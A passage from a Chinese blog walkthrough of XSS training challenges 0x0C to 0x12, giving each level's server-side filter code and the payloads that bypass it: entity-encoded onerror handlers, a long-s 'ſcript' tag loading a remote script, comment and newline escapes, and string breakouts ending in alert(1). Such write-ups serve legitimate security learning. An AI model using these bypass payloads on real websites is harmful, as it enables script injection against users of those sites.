<h2 id="0x0C-转化大写-过滤script"><a href="#0x0C-转化大写-过滤script" class="headerlink" title="0x0C  转化大写+过滤script"></a>0x0C  转化大写+过滤script</h2><h3 id="Server-Code-11"><a href="#Server-Code-11" class="headerlink" title="Server Code"></a>Server Code</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  input = input.replace(/script/ig, &#x27;&#x27;)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  return &#x27;<span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#x27; + input + &#x27;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了<script>，上一关的方法一无效了，但是方法二依然可以</p>
<h3 id="Payload-10"><a href="#Payload-10" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="0x0D-注释符-换行符绕过"><a href="#0x0D-注释符-换行符绕过" class="headerlink" title="0x0D  注释符+换行符绕过"></a>0x0D  注释符+换行符绕过</h2><h3 id="Server-Code-12"><a href="#Server-Code-12" class="headerlink" title="Server Code"></a>Server Code</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  input = input.replace(/[&lt;/&quot;&#x27;]/g, &#x27;&#x27;)</span><br><span class="line">  return `</span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">          <span class="comment">// alert(&#x27;$&#123;input&#125;&#x27;)</span></span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  `</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.85);">把其中的 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&lt;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);">、</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&quot;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);"> 和 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&#39;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);"> 字符替换为空字符串，最后将处理后的字符串嵌入到 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&lt;script&gt;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);"> 标签里作为 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;alert&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);"> 函数的参数，并且返回包含 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&lt;script&gt;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);"> 标签的字符串。</font></p>
<h3 id="Payload-11"><a href="#Payload-11" class="headerlink" title="Payload"></a>Payload</h3><p>自己写了半天写了一个</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">alert(1)--&gt;</span><br></pre></td></tr></table></figure>

<p>首先用换行符绕过<code>//</code>，然后用<code>--&gt;</code>注释符过滤后面的<code>&#39;)</code>。但是还是无法触发</p>
<p><img src="/./images/20250621_1354384573.png"></p>
<p>不知道为啥注释符和alert(1)不能一起，不然无法触发</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">alert(1)</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<h2 id="0x0E-下划线干扰-大写转化"><a href="#0x0E-下划线干扰-大写转化" class="headerlink" title="0x0E 下划线干扰+大写转化"></a>0x0E 下划线干扰+大写转化</h2><h3 id="Server-Code-13"><a href="#Server-Code-13" class="headerlink" title="Server Code"></a>Server Code</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  input = input.replace(/&lt;([a-zA-Z])/g, &#x27;&lt;_$1&#x27;)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  return &#x27;<span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#x27; + input + &#x27;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会转化大小写并且添加下划线干扰</p>
<p><img src="/./images/20250621_1354382278.png"></p>
<h3 id="Payload-12"><a href="#Payload-12" class="headerlink" title="Payload"></a>Payload</h3><p>使用特殊符号<code>ſ</code>绕过，该符号是古英语的小写s</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;ſcript <span class="attr">src</span>=<span class="string">&quot;https://xss.haozi.me/j.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſvg/onload=<span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x6C;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x29;</span>&gt;</span><br></pre></td></tr></table></figure>

<h2 id="0x0F-HTML实体转化"><a href="#0x0F-HTML实体转化" class="headerlink" title="0x0F HTML实体转化"></a>0x0F HTML实体转化</h2><h3 id="Server-Code-14"><a href="#Server-Code-14" class="headerlink" title="Server Code"></a>Server Code</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  function escapeHtml(s) &#123;</span><br><span class="line">    return s.replace(/&amp;/g, &#x27;<span class="symbol">&amp;amp;</span>&#x27;)</span><br><span class="line">            .replace(/&#x27;/g, &#x27;<span class="symbol">&amp;#39;</span>&#x27;)</span><br><span class="line">            .replace(/&quot;/g, &#x27;<span class="symbol">&amp;quot;</span>&#x27;)</span><br><span class="line">            .replace(/&lt;/g, &#x27;<span class="symbol">&amp;lt;</span>&#x27;)</span><br><span class="line">            .replace(/&gt;/g, &#x27;<span class="symbol">&amp;gt;</span>&#x27;)</span><br><span class="line">            .replace(/\//g, &#x27;<span class="symbol">&amp;#x2f;</span>&#x27;)</span><br><span class="line">  &#125;</span><br><span class="line">  return `<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">&quot;console.error(&#x27;$&#123;escapeHtml(input)&#125;&#x27;)&quot;</span>&gt;</span>`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/./images/20250621_1354399191.png"></p>
<p>对一些比符号进行了HTML实体编码，但是由于输入部分位于标签的属性中，转化了HTML实体后依然可以解析。</p>
<h3 id="Payload-13"><a href="#Payload-13" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;);alert(1)//</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;);alert(&#x27;XSS</span><br></pre></td></tr></table></figure>

<h2 id="0x10-window"><a href="#0x10-window" class="headerlink" title="0x10  window"></a>0x10  window</h2><h3 id="Server-Code-15"><a href="#Server-Code-15" class="headerlink" title="Server Code"></a>Server Code</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  return `</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">data</span> = $&#123;input&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  `</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;window&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);"> 是一个全局对象，在浏览器环境中代表浏览器窗口</font></p>
<h3 id="Payload-14"><a href="#Payload-14" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(1)</span><br></pre></td></tr></table></figure>

<p><img src="/./images/20250621_1354392941.png"></p>
<h2 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h2><h3 id="Server-Code-16"><a href="#Server-Code-16" class="headerlink" title="Server Code"></a>Server Code</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// from alf.nu</span><br><span class="line">function render (s) &#123;</span><br><span class="line">  function escapeJs (s) &#123;</span><br><span class="line">    return String(s)</span><br><span class="line">            .replace(/\\/g, &#x27;\\\\&#x27;)</span><br><span class="line">            .replace(/&#x27;/g, &#x27;\\\&#x27;&#x27;)</span><br><span class="line">            .replace(/&quot;/g, &#x27;\\&quot;&#x27;)</span><br><span class="line">            .replace(/`/g, &#x27;\\`&#x27;)</span><br><span class="line">            .replace(/&lt;/g, &#x27;\\74&#x27;)</span><br><span class="line">            .replace(/&gt;/g, &#x27;\\76&#x27;)</span><br><span class="line">            .replace(/\//g, &#x27;\\/&#x27;)</span><br><span class="line">            .replace(/\n/g, &#x27;\\n&#x27;)</span><br><span class="line">            .replace(/\r/g, &#x27;\\r&#x27;)</span><br><span class="line">            .replace(/\t/g, &#x27;\\t&#x27;)</span><br><span class="line">            .replace(/\f/g, &#x27;\\f&#x27;)</span><br><span class="line">            .replace(/\v/g, &#x27;\\v&#x27;)</span><br><span class="line">            // .replace(/\b/g, &#x27;\\b&#x27;)</span><br><span class="line">            .replace(/\0/g, &#x27;\\0&#x27;)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  return `</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> url = <span class="string">&#x27;javascript:console.log(&quot;$&#123;s&#125;&quot;)&#x27;</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> a = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;a&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  a.<span class="property">href</span> = url</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(a)</span></span><br><span class="line"><span class="language-javascript">  a.<span class="title function_">click</span>()</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就简单的闭合就可以了</p>
<p><img src="/./images/20250621_1354393661.png"></p>
<h3 id="Payload-15"><a href="#Payload-15" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;);alert(3)(&quot;</span><br></pre></td></tr></table></figure>

<h2 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h2><h3 id="Server-Code-17"><a href="#Server-Code-17" class="headerlink" title="Server Code"></a>Server Code</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// from alf.nu</span><br><span class="line">function escape (s) &#123;</span><br><span class="line">  s = s.replace(/&quot;/g, &#x27;\\&quot;&#x27;)</span><br><span class="line">  return &#x27;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&#x27; + s + &#x27;&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就简单转义了一个"符号，刚好可以用来闭合console.log</p>
<p>然后构建payload闭合下面的<script>即可</p>
<h3 id="Payload-16"><a href="#Payload-16" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="number">1</span>)<span class="comment">//</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/./images/20250621_1354395873.png"></p>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><table>
<thead>
<tr>
<th align="center"><font style="color:rgb(34, 34, 34);">名称</font></th>
<th align="center"><font style="color:rgb(34, 34, 34);">地址</font></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><font style="color:rgb(34, 34, 34);">理解浏览器解析规则文章</font></td>
<td align="center"><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/292.html"><font style="color:rgb(92, 142, 198);">http://bobao.360.cn/learning/detail/292.html</font></a></td>
</tr>
<tr>
<td align="center"><font style="color:rgb(34, 34, 34);">XSS编码剖析</font></td>
<td align="center"><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/43285.html"><font style="color:rgb(92, 142, 198);">https://www.freebuf.com/articles/web/43285.html</font></a></td>
</tr>
<tr>
<td align="center"><font style="color:rgb(34, 34, 34);">Browser Security-超文本标记语言（HTML）</font></td>
<td align="center"><a target="_blank" rel="noopener" href="https://www.madebug.net/static/drops/tips-147.html"><font style="color:rgb(92, 142, 198);">https://www.madebug.net/static/drops/tips-147.html</font></a></td>
</tr>
<tr>
<td align="center"><font style="color:rgb(34, 34, 34);">编码与解码-浏览器做了什么</font></td>
<td align="center"><a target="_blank" rel="noopener" href="http://xuelinf.github.io/2016/05/18/%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88/"><font style="color:rgb(92, 142, 198);">http://xuelinf.github.io/2016/05/18/编码与解码-浏览器做了什么/</font></a></td>
</tr>
<tr>
<td align="center"><font style="color:rgb(34, 34, 34);">深入理解浏览器解析机制和XSS向量编码 文章总结</font></td>
<td align="center"><a target="_blank" rel="noopener" href="https://www.wjlshare.xyz/2019/08/10/%e6%b7%b1%e5%85%a5%e7%90%86%e8%a7%a3%e6%b5%8f%e8%a7%88%e5%99%a8%e8%a7%a3%e6%9e%90%e6%9c%ba%e5%88%b6%e5%92%8cxss%e5%90%91%e9%87%8f%e7%bc%96%e7%a0%81-%e6%96%87%e7%ab%a0%e6%80%bb%e7%bb%93/"><font style="color:rgb(92, 142, 198);">https://www.wjlshare.xyz/2019/08/10/深入理解浏览器解析机制和xss向量编码-文章总结/</font></a></td>
</tr>
<tr>
<td align="center"><font style="color:rgb(34, 34, 34);">XSS与字符编码的那些事儿 ---科普文</font></td>
<td align="center"><a target="_blank" rel="noopener" href="https://www.madebug.net/static/drops/tips-689.html"><font style="color:rgb(92, 142, 198);">https://www.madebug.net/static/drops/tips-689.html</font></a></td>
</tr>
<tr>
<td align="center"><font style="color:rgb(34, 34, 34);">XSS之绕过WAF总结</font></td>
<td align="center"><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wjrblogs/p/12341190.html"><font style="color:rgb(92, 142, 198);">https://www.cnblogs.com/wjrblogs/p/12341190.html</font></a></td>
</tr>
</tbody></table>
<p><font style="color:rgb(35, 38, 59);">推荐一些在线编码的网站：有</font><font style="color:rgb(35, 38, 59);"> </font><strong><font style="color:rgb(35, 38, 59);">0x_Jin</font></strong><font style="color:rgb(35, 38, 59);"> </font><font style="color:rgb(35, 38, 59);">大佬的 XSS_ENCODE 谷歌插件，解压后可用地址：</font><code>**&lt;font style=&quot;color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);&quot;&gt;链接：https://pan.baidu.com/s/1JFMC1uuWq0mgUF07O8SAlQ 提取码：3rj4&lt;/font&gt;**</code></p>
<table>
<thead>
<tr>
<th align="center"><font style="color:rgb(34, 34, 34);">名称</font></th>
<th align="center"><font style="color:rgb(34, 34, 34);">地址</font></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><font style="color:rgb(34, 34, 34);">CTF在线工具</font></td>
<td align="center"><a target="_blank" rel="noopener" href="http://ctf.ssleye.com/"><font style="color:rgb(92, 142, 198);">http://ctf.ssleye.com/</font></a></td>
</tr>
<tr>
<td align="center"><font style="color:rgb(34, 34, 34);">HTML字符实体转换</font></td>
<td align="center"><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/zifushiti.php"><font style="color:rgb(92, 142, 198);">https://www.qqxiuzi.cn/bianma/zifushiti.php</font></a></td>
</tr>
<tr>
<td align="center"><font style="color:rgb(34, 34, 34);">Unicode与中文互转 16进制Unicode编码转换、还原</font></td>
<td align="center"><a target="_blank" rel="noopener" href="http://www.msxindl.com/tools/unicode16.asp"><font style="color:rgb(92, 142, 198);">http://www.msxindl.com/tools/unicode16.asp</font></a></td>
</tr>
<tr>
<td align="center"><font style="color:rgb(34, 34, 34);">Unicode 编码&解码</font></td>
<td align="center"><a target="_blank" rel="noopener" href="https://www.css-js.com/tools/unicode.html"><font style="color:rgb(92, 142, 198);">https://www.css-js.com/tools/unicode.html</font></a></td>
</tr>
</tbody></table>
<p><a target="_blank" rel="noopener" href="https://saucer-man.com/information_security/103.html">探索XSS利用编码绕过的原理 - yanq的个人博客</a> （强推！很不错）</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yunen/p/13561433.html">以浏览器解析机制来理解XSS载荷的编码转换 - Yunen的博客 - 博客园</a></p>
</script></p></h1></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://drblack.top">Drblack</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://drblack.top/2025/05/08/XSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">https://drblack.top/2025/05/08/XSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://drblack.top" target="_blank">Drblack'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/">知识点</a></div><div class="post_share"><div class="social-share" data-image="/img/1000.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/05/25/MCP%20%E5%AD%A6%E4%B9%A0/" title="MCP入门"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">MCP入门</div></div></a></div><div class="next-post pull-right"><a href="/2025/03/16/Prime_Series/" title="Prime_Series"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Prime_Series</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/09/08/MAC%E5%AF%BC%E5%85%A5%E9%9D%B6%E6%9C%BA/" title="MAC导入红日靶机"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-08</div><div class="title">MAC导入红日靶机</div></div></a></div><div><a href="/2023/11/02/Kerberos%E5%8D%8F%E8%AE%AE/" title="Kerberos协议分析（数据包）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-02</div><div class="title">Kerberos协议分析（数据包）</div></div></a></div><div><a href="/2023/05/25/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/" title="Nginx解析漏洞复现及原理解析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-25</div><div class="title">Nginx解析漏洞复现及原理解析</div></div></a></div><div><a href="/2023/11/08/PTH%E3%80%81PTK%E3%80%81PTT%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93/" title="PTH、PTT、PTK 攻击总结"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-08</div><div class="title">PTH、PTT、PTK 攻击总结</div></div></a></div><div><a href="/2023/11/04/php-SER-libs%E9%9D%B6%E5%9C%BA%E8%A7%A3%E9%A2%98/" title="php-SER-libs靶场"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-04</div><div class="title">php-SER-libs靶场</div></div></a></div><div><a href="/2023/10/20/upload-labs-Pass1-21%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/" title="upload-labs Pass1-21通关笔记(详细版)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-20</div><div class="title">upload-labs Pass1-21通关笔记(详细版)</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/1000.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Drblack</div><div class="author-info__description">努力就会一直幸运</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/drblack000"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Drblack000" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:drblack_di@163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTML%E6%A0%87%E7%AD%BE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">HTML标签知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E4%BA%8B%E4%BB%B6%E5%B1%9E%E6%80%A7"><span class="toc-number">1.1.</span> <span class="toc-text">常见事件属性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-URL-%E5%8D%8F%E8%AE%AE%E6%89%A7%E8%A1%8C-JavaScript-%E4%BB%A3%E7%A0%81%E7%9A%84%E6%A0%87%E7%AD%BE%E5%B1%9E%E6%80%A7"><span class="toc-number">1.1.1.</span> <span class="toc-text">通过 URL 协议执行 JavaScript 代码的标签属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E6%A0%87%E7%AD%BE"><span class="toc-number">1.1.2.</span> <span class="toc-text">特殊标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8C-JavaScript-%E4%BB%A3%E7%A0%81%E7%9A%84%E6%83%85%E5%86%B5"><span class="toc-number">1.1.3.</span> <span class="toc-text">无法执行 JavaScript 代码的情况</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%90%E4%BA%9B%E6%A0%87%E7%AD%BE%E7%9A%84%E5%86%85%E5%AE%B9%E5%8C%BA%E5%9F%9F"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">某些标签的内容区域</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%83%A8%E5%88%86%E6%A0%87%E7%AD%BE%E7%9A%84%E7%89%B9%E5%AE%9A%E5%B1%9E%E6%80%A7"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">部分标签的特定属性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.4.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E3%80%81%E8%A7%A3%E7%A0%81"><span class="toc-number">1.2.</span> <span class="toc-text">编码、解码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#URL%E7%BC%96%E7%A0%81"><span class="toc-number">1.2.1.</span> <span class="toc-text">URL编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81"><span class="toc-number">1.2.2.</span> <span class="toc-text">HTML实体编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JS%E8%A7%A3%E7%A0%81"><span class="toc-number">1.2.3.</span> <span class="toc-text">JS解码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E7%A0%81%E5%85%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">解码全流程分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90%E9%A1%BA%E5%BA%8F"><span class="toc-number">1.4.</span> <span class="toc-text">解析顺序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%BE%E7%82%B9"><span class="toc-number">1.5.</span> <span class="toc-text">难点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#URL%E7%BC%96%E7%A0%81%E8%8C%83%E5%9B%B4"><span class="toc-number">1.5.1.</span> <span 